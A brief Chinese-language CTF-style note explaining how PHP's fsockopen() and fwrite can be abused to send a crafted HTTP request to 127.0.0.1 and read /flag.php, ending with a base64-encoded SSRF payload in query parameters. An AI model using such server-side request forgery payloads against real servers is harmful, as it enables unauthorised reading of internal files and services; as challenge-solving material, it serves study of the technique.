fsockopen() 函数是用于建立一个 socket 连接
fwrite将data写入当前会话
可以构造一个请求头，读取服务器本地文件

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
```



payload:

  ?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=